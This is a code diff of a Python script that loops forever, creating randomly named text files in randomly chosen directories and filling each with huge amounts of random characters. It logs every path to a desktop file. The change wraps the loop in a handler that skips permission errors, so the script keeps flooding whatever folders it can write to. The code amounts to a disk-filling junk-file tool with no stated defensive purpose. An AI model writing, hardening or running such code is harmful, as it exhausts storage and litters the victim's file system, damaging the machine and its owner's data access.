@@ -14,24 +14,24 @@ symbols = "~@#$%^-_(){}'`qwertyuiopasdfghjklzxcvbnm"
 
 
 while True:
+    try:
+        nam = ""
+        for i in range(randint(1, 100)):
+            nam += choice(symbols)
 
-    nam = ""
-    for i in range(randint(1, 100)):
-        nam += choice(symbols)
+        name = choice(totallist) + f'\\{nam}.txt'
 
-    name = choice(totallist) + f'\\{nam}.txt'
-
-    #"""This block is needed to track the process of creating files.
+        #"""This block is needed to track the process of creating files.
     
-    with open ("C:\\Users\\User\\Desktop\\file_path.txt", "a") as f:     
-        f.write(name + "\n")#"""
+        with open ("C:\\Users\\User\\Desktop\\file_path.txt", "a") as f:
+            f.write(name + "\n")#"""
 
-    with open (name,"w") as file:
-        for i in range (randint(100, 1000)):
-            line = ""
-            for i in range (randint(100, 10000)):
-                line += choice(symbols)
-            file.write(line)
+        with open (name,"w") as file:
+            for i in range (randint(100, 1000)):
+                line = ""
+                for i in range (randint(100, 10000)):
+                    line += choice(symbols)
+                file.write(line)
 
-
-
+    except PermissionError:
+        continue
